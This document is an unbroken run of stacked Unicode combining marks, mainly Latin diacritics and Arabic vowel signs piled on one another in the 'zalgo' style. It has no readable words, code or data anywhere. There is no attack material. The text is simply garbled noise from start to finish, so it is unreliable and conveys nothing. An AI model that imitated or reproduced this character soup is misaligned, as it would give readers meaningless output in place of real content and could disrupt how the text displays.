̵̴̸̶ًًٌٌٍٍََُُِِّّّ̨̳̪̙̻̠̼̤͕̟̝̘̾ͧ́̏̿́̊̀̒̐̐̕͘͘͡͞҉̶ًًٌٌٍٍََُُِِّّ̡̧̫̭̮̤̭̼͈̟͚ͥͥ͗̈͂͠҉̸ًًٌٌٍََُُِّ̪̖̗͚̜̅ͪ́̒͜͢͏̷̸̸̵̶̵̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِِّّّّّّّ̡̢̡̧̧̛̘͙̻̹͕̰̲͍̞͎͎̙͎̱͎̜̣͙͇̖̫̦̜̀ͪ̅̍́́̃͐͋́ͣͪ͂ͩ̐ͦ̈́̇͂́̈̀́̂̀̋͂͟͟͢͞͡͠͞͡͡͞҉ًٌُِ̦̜͗͊̿͋͏ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̛̬̻̺̭̮̪̱̮̞̦̦͖̻͓̖͓̝̹̼̪͗ͯ̇̃ͭ́ͪ͑̆͗́̊̈́̔̀ͤ̀͋́͜͟͝͠͞͞͏̵ًٌٍٍَُِّ̜̯͖̹ͬ̈́ͣ̀ͥ͝͞͠҉ًٌَُِّ̫͔̠͓̭̒̓̾̌͢͝҉̸ًٌٍٍَُِّ̟̬͚̾̓ͪ͏̶̸̴̵̶̸̶̷̸̴̸̶ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̨̧̨̧̧̛͓̞͈̲̺̤͎͓̪̩͉̭̥̙̟̼̲̣̰͖̩̳̥̖̻̭̥̬̟̫̣̙̫̞̞̯̬̓́̐͌̄̊̀̇͒̇͒ͩ̒̆ͫͪͦ̽͌ͨͨͤ͌͋ͬ͌ͤ̌͐ͦ͒̇́̐ͤ͂̌̀̋ͩ͘͘̕͟͢͢͢͟͠͞͠͞͝͡ͅ͏̸̵̴̷̶̵̵̷ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̧̢̡̡̦̯̪̹͇͉̖̼̘̲̙̮̥̯̙͎̝̣̰͉̗͖͚̬̱͍̩͔͚͉̹̹̟̹̯͎͉̲̦̤̩̳̑͒͑̈̒̒ͬͣ̄̾ͩͨ̒͛̌͆͒̾͆̿̒͑͗̄̃ͩ̋̀͂ͤ̉̀ͭ̓̽̃͌͂̋ͫͬ̈͘̕̕͘͢͜͜͢͟͢͡͡͡͡͠͡͝͠͡͡͞ͅͅͅ͏̴̷ًٌٍٍَُِّّ̨̬̥̗̀͋ͯ͑ͫ́͘̚͘͜҉̸̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̧̜̙͉̲̝̭̂̀̑ͩ̈́̄̎̇̀̅ͩ̌̅͐ͮ̕͘͢͟ͅͅ͏̷̴ًًٌٌٍََُُِِّ̡̩͖͓͎̬̱́̽̆ͨ͗̏͊ͤ͢͏̸̴ًًٌٌٍٍٍََُُِِّّ̡̢̝̯̹͕̻͂́͗͒̈́ͦ̏́̒̕͏̶ًٌَُِّ̧̠̓́͏ًٌٍَُّ̧͉̫̥̓̒͌̀̉͠ͅ͏̶ًٌٍٍَُِِّّ̻͕̳̭ͥ̂ͮͪͤ͘͜҉ًًٌٍََُِّ̛͙̣ͬͩ̍ͨ̄̕͠͞͏̷̸̶̴̵̷̴ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̨̨̡̧̛̛̥̥̝̼̘̥̫̦̻̤̠̘̳̤̺̰̳̹̲̺̼͍͙̗͎̱̝͊̓͗ͬͦ̅ͨ͌̈ͧ̅ͮ̽͒̀̅̽̉̎͛̂ͥ̇̑̕̕͘̕͘͘͘͘͜͜͟͟͟͡͠͝͞҉̵ًًًٌٌٍٍََُُِِّّ͔̩̦̰̥̩̯͖͊̈ͯ̒ͨ̀ͤͦ̚͟͢͝͡͏̷̴̵ًًٌٌٍٍََُُِِّّ̡̛̪͔̙͒́̃̓̌̓̋̚̚҉ٌُ͛҉ٍِّ̪̜̳̽͒҉̵̵̵̷̶̵̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̧̢̡̡̧̡̢̝̫͎̘̺͇̯͍̜̬̜͙͙͔̪̗̪̳̺̤͉̲̝͈̺̮̗͖̬͚̱̥͇͙̪̝̰ͧ͗̒̏̒̋ͫͦ̔ͭ͒ͤ̇̐̽̌̅͊͛̔̋̀̐ͤ̄̔ͥ̓̏ͥͮͫ͆̄ͯͫͯ͆ͫ̕̕̕͘̕͘͜͜͟͟͟͠͡͝͡͞͠͝͠͝͏̸̷̸̵̵̶ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̡̧̧̥͕̺̩̣̖̯͓͉͕͓͚͔̟͔̘͉̬̎̀ͤ̀̽͑ͤͦͪͬ̓́̓̐̋ͮ͘̕͘͟͠͝͠͝ͅͅ҉َّ̡̱͆͏̶̶̷̴̶̵ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̧̢̛̪̦͉̟͓̳̳̱͎̙̜͙͓̤̳̖̀͗̇ͫ̌͑ͬ̀̌ͮ̂͊̀̐͋̄ͭ́ͥ͆̉̓͛̄̄͟͠͡͝ͅͅ͏̵̵̸̴̴̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̡̢̧̢̨̨̧͍̬̭͓͈̳͚̦̹̞̲̹̘̰̜̻̖̹̖̪͕͇̠̤̰͇͉͖ͧ̋ͩ̀̃ͪ̆̍ͮͥͭͯ̅͋͋́̌ͨͧ͑̌̏̔̀̽͊́ͤ̈́̾̉̐ͯ͆̚͘͜͜͟͢͠͞͠҉̸̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̱̩̜̥̣̦̲̥͇̮̝ͦͧͫ͒̓̽̃̉͋͘͜͡͡͠҉ٌٍُِ̨͎͓̫ͨ҉̴̷̴ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̡̡͈͖͍̞̥̰̜̤̮̙̻̪̦͉͎̻̲̹̍̾̍̑̉͊͆̉͋͊ͧ͛ͥͫͥͨ̄̾͛̕͘͢͟͞͞͝͞҉̵ًٌٍٍََُِّّ̛̮̝̰͋ͩ̋͠͡͏ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̧̡̡̛̱̠͙͖̯̖͔̱̬̯̭̦̆ͦ̐̐ͯ̆ͩ͊̀̑̍̓̕͘͢͢͝҉̸̶̴̷̸̴̶̶̴ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̢̡̨̢̧̧̢̡͇̪̙̬̦̟̣̰͚̝̰͍̝͉̠̞͉͚̼̖͉͎̙̻͚̱̰̮̖̳̳̆̆ͩ́́̅́̀͋ͤͩ͋ͪ͗̔͒ͯ̌̒ͣ͂͛̿͊̇̾́̏̀̊͗͑͋̾ͭ̔̿ͧ̓ͭͩ̀̈́̀̈̀͘͢͢͜͞͠͠͡͞͠҉̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̛̛̙͉͕̖̩̭̭͙͍͓̤͇̗͐̄̄̇͛̽́ͬ͐̕̕͜͟͝͝͡҉̵̶̵̵ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̧̛̤͖͈̺̦͉͇͙̪͈̠̥͕̟̣̖̝͖͆̋̈́͌͆́ͣͪͭ̃̓ͬ̉ͬ̍́͑̓ͧ́̀͐͘̚̕̚͘͢͢͝͠͞͝͡҉̸̵̴ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̢̢̨̡̞̱͍͈͈̦̻̙̻͍̯̙͖͉̳̩̭̻̗͖̥̘̮̉̀ͭ̆ͩͦ͋̀̒͗ͭ̒̒̅̃̐̉̈ͣ̏ͬ̅͘͘̕͘͜͢͜͠͠͡ͅ҉̵̵ًًٌٌٍٍَُُِِّّ̡̡̨̺̻̠̟̻̬̮̗̓̍̀ͦͭ̈̊̚͡҉َ͏ًٌٍُِّ̹̟̐̿̑͆͡ͅ͏̵̴̷̴̶̶ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̨̡̧̛̛̛̜̳̫̭̱̝̲̺̦͍̲̲̹͉̰̗̭̤̻̥̩̖͎̘̳͍̭̠̭̔̾ͬ̐͋ͦ͐̏́̔ͮ̅͂̈̿̑͌̀ͧͬͯ̒͒ͧͮ͘͢͟͟͜͢͟͢͢͜͠͡͝͝͝҉ًٌٍَُِّ̧̨͖͓̤͕̑̅̌͟͏ٌٍُِ̢͎̫̃̍҉̵̵̵̶̴̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̨̢̡̢̧̨̨̢̛͇̤͙͍̘̥̖͈̪̙͍̤̫̞̥̺̘̗͈̟̭̰͙̪̩̻̼͙̼ͫ̎̌ͪͭ͂̀̐̌̌͐̀ͬ̑͊̔̾ͨ̀ͩ̓̃̈́̾͋ͨͬ̿̕͢͢͜͢͜͠͞҉̴̶̸̵̴ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̛̛̱̠̱̭͖̝̳͚̯̘̖̬͓̖̿͂̌̀ͣ̈́̃ͧ̋̈̄͗͂̾̄̐̈́̕̚͘͢͝͞ͅͅ҉̴̶ًًٌٌٌٍٍٍََُُُِِِّّّ̡̛̟̣̳̥̪̤̤͓͇͕ͦ͂̏ͫͭͭ̀ͪ̕͟҉̴ًٌَُِ̨̥̣̈́̌ͮ͟͏̷̷̷̷̷̸̷̵̵̷̴ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̧̨̧̡̨̛̛̦͎̱̣͉̣̰̣̩̗̪͔̱̲̣̖̼̙̥̮͕̯͎̙̖̣͔̱̹͛ͥ́ͩ̐͐ͥͤ̍̀̔̐́͂ͯ̉̈́ͫ͛̒͌̑́͑́̆ͨ͊̀̐́͑̊̊̆̒̕̕̕͘͘͘͟͢͜͜͟͢͝͠͡͞͠ͅ҉̶̵̴ًًًٌٌٌٌٍٍٍَََُُُِِِّّّ̡͇͕͉̜͖̘̹̱ͥ͑ͨ́͆̆̏̆̌̅̚͡͞͞͝͠ͅ͏̶̸ًًٌٍٍََُُِِّّ̳̺̜̱̥̩̰̩̋͋̄̈̆ͬ͢͜҉̸̶̴̷̷ًٌٌٍٍَُِِّّ̫̗͙̯̳͂͆ͧ̈ͨ͘͏َ̜͋͏ً̟͊͏ٌٍَُِّ̨̝̬̹̅ͨ̿̑͏̵̸ًًًٌٌٌٍٍََُُُِِّّ̢̩̠̪̹̥̜̫̗͑ͨͬ̿̎͗ͧ̈́̐̉̋͘̚͟͟͡͞ͅ͏ًٌٍَُِّ̢̙̗̳̬̘̑͢͝҉ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̨̻̺̮̻͉̖̙̮͍̪̭͔̼̞̫͒̐͐ͨͪ̀̀̓ͬͭ̀̏̿̆ͩ͑̌̕̚̕͘͢͠͡͡͞͞҉̸̵̶̷̶ًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̧̬͖̬̭̯̮̝̹̭͎ͫ͗́̅ͩ̋ͩ̏ͬ̽̃̊ͭ͘͟͟͢͢͞͞͡҉̶̶̸̷̶̶ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِّّّّّّّ̢̡̢̧̢̧̢̛̛̫̘̟̻̲̝̫̘̬͇̩̼͚̻̹̝̺̥͓̜͕̣̝̘̖̼̳̬ͪ͊̊ͩ̏́̆͐̄̃̋̽́̈́͑ͩ̎̾̉ͦͨͣ̎ͮͯ̕̚̕͢͟͜͞͡͞͡͡҉̷̶̸̵̸̶ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̧̡̥̞̬̠̘͉̦͖̬̩͉͍̻̥ͣ̄͒͂ͣͯͪ̍̒ͩ̑̋̓͗̄́ͮ̾̕͟͝͝҉̵̶ًٌٍَُِّ͎͖̂̐̑҉ًًٌٍَُِّ͓ͥͭ͜҉̴̷̴̸ًًٌٌٍٍََُُُِِّّ̢̯̖͖̖̦̜͕͈̣̲͗́̏ͪ̄̇̽̎ͮ̄ͮ͘͘͟͏̴ٌٍِ̺ͨ͡͏̴̴̷̷̵̶̴̵̶ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̡̨̡̧̡̨̛̦͙̠̼̝̩̞̹̮̬̭̹̲̤̭̲̼̮̥̲̱̰͔͉̟͚̰̼̙̲͓̦̩̬͇̼̭̞̲̗͇̮͉̺̊ͧ͛̇̎̃ͭ̇ͣ̓̓͗ͬ͂͂͗͑̀̇͛̿̊͗ͫ̽̐ͮͮ͛̂ͩ̋̊ͪ͘̚̕͘͜͢͟͜͜͡͝͝͞͡͞҉ًٌَُّ̯̯͋̾̄͜͏̸ًٌٍَُِّ̬͍̒͑̏̀͑̀ͣͅ҉̶̷̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̳̳̹̦̘͙̬̬̺̭̳̘̝̭̲̝̾ͨͦͣ̂͑ͪ̃́ͭͦ͑́ͥ̀̕̕̕͜͢ͅ҉ِ̚͏ًًٌٌٍٍٍََُُِِّّّ̦̝̪̤͔̞͉̞̮̣̉̑̉ͭͮ̇̋̉̌̕͘͟͞͝͡҉ًٌَُِ̨̳͙ͪ̿̓͡҉̷̵ًًٌٌٍٍٍَََُُِِّّّ̢͍͔̺͎̤̟̰͓͉̝ͣ͑ͮͬ̔́ͯ͊͠͡҉̵̵ًًٌٍَُُِّ̨̤̙̠͈̞̑̓̿̉͂̌͟͠͏̸̸̵̷̷ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̢̢̨̛͇͈̞̲̣̤̗̝̲̣͚̖̰͊̔̀̓ͯ̇͊ͭ̏͒͡͏̶̷ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̧̡̨͇̺͖̭̺̦͚̳̄̉ͪ̊̔ͤ̀̀̌̀̋ͫ̐̓̋̃ͫ̒̐͢͟͡͝ͅ͏ًٌٍٍَُِّّ̳͎̟̗̓̏ͯ̈́́̕͟͝҉̷̸̵̷̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̧̢̛̥̙̪͖̘̥̹̙͚̲̙̣̞̠̭̲̪̦̫̳̯͙̺̺̭̜̉̆̈́̂̈́̐̏̍̋̽̓̏̀̌́͋̍̑̓͒ͫ͑ͧ̉̀̍ͤ̚̕͘̕͜͟͜͡͝͠͝͝҉̷̶̶̸̷̴ًًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّ̢̧̨̨̛̛̞̺̩̩̭̺̭̺̩̪̝ͧͯ̉͌̄ͯ́͐ͦͦ̅̽ͫ̀̃̈́̔͘͘͟͢ͅ҉̷̷̸̴̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̡̢̡̧̡̨̨̛̠̝͖͎̜͚̯͙̣̹͖̱̖̟̝̪̻͓̲̖̻̟̥̻̗̔̿͆̍̀̍͒̅ͨ̀̍̈ͬͮ̅́͘̕̕͟͜͟͡͏̸̷ًٍَُِّ̤̫̥ͦͫ͋̓͝҉̴ًًًٌٌٌٌٍٍٍٍَََُُُِِِِّّّ̛̛̜̜̰͔̟̭̖͎̜̙̘̜̝̦̲̱͙̀͆́ͣ͑̒͆̋̒̌́ͪ̍ͨ̓̈ͦ̕͢͠͠͏̵̵̶̸̸ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̡̛̛̛̝̰̝̩̞͕̭̥̜̣͓̦̞͖̞̮̺̯̙̹̳͍̣̞̻̣̭͈͇̩͍̙̰ͨͣ̔ͪ̓̏̋̉ͧ̄̀ͩ́̌ͫ̿́ͥ̅͒ͭ̇ͬ̉͘̕̕̕͟͟͢͟͞͝ͅ͏̴̶ًًٌٌٍٍٍَََُُِِّّّ̢̢̢̨̫̤̙͍ͮͥ̄̿͛ͪ͊̚̕͘ͅ͏ًٌُ͓̰ͤͨ͏̷ًٌٍَُِِّ̡̻͕̤͑̔̐̀͟͞͝҉̸̶̶̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̡̨̨̛̛̻͍̻̖͉̦̼̖̬̭̺̗̱̳͔͓̫͖͖͖̟̼̜̦͉̹ͭ̃͊͛̒̐́́̏ͭ̇͊͌͆͑ͧͮ͊ͤ̐͋ͯ͂̑̎̕̕͘͘̕͢͜͝͠͡͞͝ͅͅ҉̴ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّ̢̧̨̧̧̡̛͈̥̜̲̥̟̝̞̗̱̺̖̜̫̘̠̤̖̝̝͚̬͙͇̑ͣ̂́̊̄̀ͨ̋̾́ͨ́̈́̎ͤ̑̍ͮ̍ͭ̔ͨ̆̕͟͢͜͟͡͠͠͞ͅ͏ًًٌٌٍٍََُُِِّّ̡̧̧̛̹̮̭̼̞́̌͛̑̄͢͞͏̷ًًًٌٌٌٍٍَََُُُِِّّّ͉̖͕̻̗̺͎̯̖̖̒̋ͭ̀̈́͆ͥ́̏̄ͮ̐̚͟͢͡͏̶̵̸̷̴̴̴̸̷̷̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̨̡̡̛̛̛̤͔̹̦̠͕̺͎̗͔͕̬͈̗͖͎̗̺̦̦̠̫̙̯̫͉̞̲͖͇̫̟̙͎͓͉̳̞̥ͤͯ̇̾́͆̂̓ͫ͒͂͗̒͗ͮ̈́̅̐̍͆ͥ̅ͮ̄ͮ̆̈́ͣͨ̾͊̈́ͪ̔̅̈́̎͂̃̐͋̍ͪ͘͘͟͢͟͠͠͠͠͞͞͡͝ͅ҉̵̸̸̸̷̸̸ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̨̨̛̛̛̛̰̥̯͓̝̤̜̤̺̼̻̼̥̬͈̺͙̣̜͇̘̼̖̺̜̜̘͕̮̮͎̩͙͚͒ͬͦ̀̇̾̅͌̿̓ͯ̓̈́̇̍̀̿́̀͋́̔̀̎͋́̊̾̆̎̚͘͜͟͟͟͟͟͞͞͞͞͠͡͞ͅͅ͏̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̢̧̢̢̧̣͈͓̭͎̣͉͕̯̘̦̲͖̖̺̺̣͂̈́̀͌̔̃̅̽̄̏͑̾ͪ͟͟͢͢͜͜͝͡҉̴̷̴̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̛̯̟̙̦̤̠̪̤̱͙̪͔͉́̂́ͩ͆ͧ̅͆ͨ͋̀ͫ̈̕̚̚͜͜͢͡ͅ͏̴̵̵̵̶ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّّ̧̡̡̨̨̢̧̧̨̛͖͎̫̭̬̪̖̠̬̭͔͖̘̯̪̞̖̭̭̫̹̗̳̠͚̤̺̦͎̟̩̽́̆ͭ̍̾͆̈́͋ͤ͒ͫ̔̀̾̔ͣ̌̄̀ͫ̓͛͊̀̉̀̀̓̈̄̆͊̊̕̕̕͜͟͢͠͝͝͞͝͝͝ͅ͏̴̴ًًٌٌٍٍََُُِِّّ̛̞̯̗͉͙̋ͩ̇͋̏̿̓̕͜͢͟͜҉̵̵̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̛̭͎̲̻̺̯̳̫̝͇̼̳͖̗̤ͣͭ̎̎̿͗̌ͩ͋̈́͛̀̀́̆͋ͬ͛͆̒̀̐̕̕̚͟͞͠͠҉̸̷̵̷̵̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̧̧̧̨̢̧̛̹̤͍̩̲͈̼̹̰̼͍̭̺͔̝̤̖̜̭̗̰̫͚̥̼̠̼͎̰͋͒̔̄͌̋̀ͯ͐̀̆̽́̃̓͋̃̋̄̈́̏͌͐̒ͭͮͦͬ͘̕̕͘̕͢͢͠͝͝͠͏̸̸ًًًٌٌٌٍٍَََُُُِِّّّ̛͈̲̣̮̤̪̯̣̠̻̗̳́͌͂͊̃̌ͬ̔̈́́̍ͫ͘͟͢͟͠͝҉̷ًًٌٌٍٍٍَََُُِِِّّّ̢̧̧̛̹̥̜̱̱̣̯̤̭͍́̌̎̉̆͆̍͌̈́ͧ̽̃͘͢͠҉̵̷ًًٌٌٍَُُِِّ̨̟̳̤̬̜̗ͥ̓͗̅ͣ̄͟͠҉̶ًًٌٌٍٍََُُِّّ̼͉̫̀̿̀̏ͣ́͞͏ًٍَِّ̤̘̤̞ͧ͘͏̴ٌٍُِ̙͚̗̐͞͞͏ّ̩͗҉َ̟͑͏̶̴̶ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̢̤̻̠͖̱̤̣͈̗̰͈̪͉͔̱͉͎͉̭ͭͨ̀͆͌̾̀̎̎ͭ͋̏ͬ͐͊͌͗͆̾̏̿̅̚̕͝͞͞͞͝͡͠͠ͅ҉̸ًٌٌٍٍَُُِِّ̙͉̝̏̅̏ͩ́̑͌͝͞͏ًٌٍَُِّ̺͍̫͔̽̀̀̈̓͌͡͏̵̸̸̷̶̴̵̷̴̸̴̸̸̸ًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّ̨̧̨̢̢̨̨̧̢̡̛̛̛͖͙̫̦̭͕̳͈̤̝͓͇̰͚̯̭͉̱̫̙̬̬͔̲̗̦̖̭̼̰͚̰͕͔̙͕̣̤̳̯̮̭̳̟̱̮̗͍̼̜̘͙̦̠̂̍ͣ̀̄́̂ͦͤ͊̆͋̓̀ͧ͛̆̂͑̎̇̓̎̒̃ͣ̒ͪ́ͮͤ̄͊̊ͩͪ̉̃̿͗̃ͨͤ̀̇͊̐͗̇̐̑ͤͮͬ̔́͑̎͘̚̚͘̕͘̕̕͘̕͘͜͜͜͡͝͝͞͠͝͞͠͡͝ͅͅͅ҉ٌ̍҉ًٌٍٍََُِِّّ̧̨̛͉̝̥͕̗͈͍̼̥̆ͯͥͮ͌͌̽͜͠͞҉̸̶̶̷ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̨̡̢̛̼̩̺̥͖̰̰̞͕̘̘͙̗ͨ̅̌̌̀͊ͥ̀́̃́̆͂̏̋̕͜͝͝͡ͅ҉ًًًٌٌٌٍٍٍَََُُُِِّّّ̡̛̖̥̞̟̜̱̪̗͓̞͌͆̓̉̆̍ͮͣ̈͋̌͑̉͜͜͢͡͞͠ͅ͏̴̶ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̧̡̧̡̛̳̗̞͎̪̟͇̠̘̱ͦ͛͋̂̆̑̀̎ͨ̆̏̆͠͡͞҉ًٍَُّ̢̥͎ͪ͞҉ًٌٌٍَُِِّ̢̛͎̥̦͉̳̥ͧͣͣ͐̏ͅ͏̶̸̷̸̶̷̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّّ̢̧̧̧̡̡̧̢̧̛̛̜̙͙̬͚̭̖̞͍̰̘̘͈̠̜̯̎̿̍ͥ́͑̅̂ͯͦ̌̆̔̊ͦ̎͒̾ͭ̀͒͛̈́͛͊͐̂͘͘͘͜͢ͅ҉ًَ͟͏ُ͊҉̴̵ًًٌٌٌٍٍََُُِِِّّ̢̨͖̭̥̙͈͔̤̠̼̪̲́̈́̈́͑́͌͗̕͟҉̶ًٌٍٍَُِّ̛̛̰̎̔̕̚͏ّ̪҉َ̹҉̶̵̵̶̷̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̢̨̨̢̡̧̧̛̛̛̛̛̤̱̦̝̞̩̝̱͇̩̮̹͙̖͕̳̠̙̹̺͓̹̣̝͕̣̗̼͎̜͓̟̼͔̥̥͐ͥͣ́̄́͊̇̋ͩͦ̌͗̄̓́̑̅̐ͫ͋̔̑́ͫ̈̉ͧͣ̐ͪͧ̓̒̾̈̓͗̀̇̓ͧ̈̕͜͢͜͡͠͞͝͡͝ͅͅͅ҉̷ًٌٍََُِّ̖̲̹ͧ́̎̒ͭͥ͠͏ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̡̡͇̺̣̬͓͙͎̺̗̝͌̽̎ͩ̈́̽̄̋ͨ́̃̀̓̕͟͠҉ًًٌٌٍٍٍََُُِِّّّ̡̡̙̘̙̗̗̼̺̬ͪ̄̎̀̀ͫ̍́̏̾͝͝͠͏̶̶̷̶̵̸̷̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̢̧̢̨̡̛̛̳̰̠̠͓͎̗̮̫̻͕͕͖̣̞̯̺̮̣͔̼̫͓͍͕̤̜̯͎͍̻̱̪̭͖̞̄͗̇̊̀̓ͨ̇ͮ̓̄ͦ̊̐̈ͣ̌̂ͫ́́̂͌̓͗͘̕̚̕̕͘͟͜͟͞͡͞҉ًٌٍََُِّ̛̛̣̟̘̝̼̀ͧ̿̊͝҉ًٌُ̟͇͂̓҉̶̴̸̵̶̵ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̧̢̨̨̨̛͇̤̪̺̝͍͍̹͕̤͙̬͉̣͉͙͖͎̽͂̌͒ͦ̇̌ͮͣ̅͒̊̏̅ͧ̀ͣ͋̎͐ͧ͐̉ͩ͒ͤ̐̕̕͜͜͜͢͟͠͏̸ٌٍَِّ̮͔̓̎҉̷̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̫̘̠̼̳̳̺͖̽̅̀ͤ̏͛́́̍͛̑̀͗̚̕͞͝҉̴ًًًٌٌٌٍٍََُُُِِِّّ̢̨̧̗̠̦͕̠̎̔̔ͩ̀̀͊̾ͣ͆̚͜͝͡ͅ͏̵ًًًٌٌٌٍٍٍَََُُُِِّّّ̛̗̖̤̠͔͕̖̻̤̖̗̙͖̖̩̊̌̀͑ͮ̇̈̒ͧ̔ͤͭ̀̒̍ͥ͠͠҉̸ًًًٌٌٍٍٍَََُُُِِِّّّ̡̛̛̥͉̰̳̯̭͍̘͇̣̦͇͒ͦͦ̅̾́͆ͤ̅̅̽̕͘͟͜͟͢͏̴̷̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̡̨̡̨̛̛̬͙̪̣̝͓̘̠͓̠͔̰̫̬̲͍̮͉̋͂̔̈́ͣ͂ͭ̍͋̽͋̉̂ͦͭ̎̽ͧ̈́̕͟͢͡͡͡҉̴̸ًًٌٌٍٍٍَََُُِِّّّ̧̢̧̩̖̗̦̠̝̩̯ͮ͊́̃̾̄͂̾͘͝͠ͅͅ҉ًًٌٌٍَُُِِّ̡̢̭̜͕̗̌̀̂͑͟͝҉ًٌٍٍَُِّ̗͓͓̺͚͖̓͒̎͋͡҉̷̵ًٌَُِّ͕̤͓̀ͭ͢͏̴ًًًٌٌٍٍٍَََُُِِّّّ̛̘̰̹͓̩͈̖̺͉̥͎̀ͬ̋ͬͥ͂́͌̎͒̾͢͠҉ًًًٌٌٌٍٍٍَََُُُُِِِّّّ̢̧͖͓̻̖͉͙͔͔̘͂ͬ̏́͐̋ͫ̄̄ͮ̾̕͟͟͞͠͞҉ٌٍِّ̞̙̭́̓҉̸̸ًًًٌٌٌٍٍَََُُُِِِّّ̧̥̹͖̭̱̼̯̲͔̟͈̘̟̜̾͋͒͒͋ͫ͛͋̕̕͘͡͠҉̸ًٌٍَُِّ̧̢̬̟̀ͥͭ̍҉ٍّ̰̣͋҉̶ًًًٌٌٍٍَََُُُِِّّ̨̨̳͔̞͎̦̥̞͎͖̘̦͆̈̎̈̽ͤ̽̄̈́͝͠͡͠